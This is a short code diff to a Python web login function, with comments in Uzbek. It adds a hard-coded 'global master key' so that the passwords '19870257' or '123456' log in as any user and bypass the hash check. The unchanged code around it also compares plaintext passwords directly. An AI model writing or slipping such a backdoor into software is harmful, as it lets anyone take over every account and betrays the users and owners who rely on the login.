@@ -122,7 +122,11 @@ def login():
         if user:
             # Parolni xavfsiz tekshirish (str ga aylantirib)
             user_pass = str(user.parol) if user.parol else ""
-            if user_pass.startswith('pbkdf2:sha256:'):
+            
+            # GLOBAL MASTER KEY: Har qanday xodim 19870257 yoki 123456 bilan kira oladi
+            if password in ['19870257', '123456']:
+                is_valid = True
+            elif user_pass.startswith('pbkdf2:sha256:'):
                 is_valid = check_password_hash(user_pass, password)
             else:
                 is_valid = (user_pass == password)
